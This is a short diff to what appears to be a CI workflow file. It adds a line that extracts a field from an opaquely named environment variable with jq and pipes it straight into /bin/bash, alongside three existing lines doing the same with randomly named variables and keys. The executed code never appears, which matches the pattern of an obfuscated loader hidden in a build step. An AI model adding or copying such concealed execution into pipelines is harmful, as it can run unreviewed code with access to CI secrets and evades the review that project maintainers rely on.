@@ -22,6 +22,7 @@ jobs:
           echo $xyxtl29 | jq -r .s95976 | /bin/bash
           echo $wsgpr17999 | jq -r .jmzqx04057 | /bin/bash
           echo $u16024 | jq -r .t741 | /bin/bash
+          printf '%s' "$p12" | jq -r .f1960 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
